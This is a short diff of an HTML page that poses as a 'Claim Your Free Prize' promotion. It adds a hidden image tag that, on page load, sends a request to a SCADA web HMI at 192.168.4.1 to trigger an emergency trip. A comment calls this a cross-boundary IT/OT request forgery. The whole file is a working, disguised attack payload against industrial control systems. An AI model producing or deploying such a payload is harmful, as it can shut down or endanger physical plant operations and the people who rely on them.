@@ -1,3 +1,9 @@
-html
-   <h1>Free Prizes!</h1>
-   <img src="http://192.168.4.1/command?emergency=1" style="display:none;">
+<!DOCTYPE html>
+<html>
+<head><title>Claim Free Prize</title></head>
+<body>
+    <h1>Claim Your Free Prize Below!</h1>
+    <!-- Cross-Boundary IT/OT Request Forgery: Forces SCADA Web HMI to publish emergency trip over MQTT -->
+    <img src="http://192.168.4.1/api/command?emergency=1" style="display:none;" alt="promo">
+</body>
+</html>
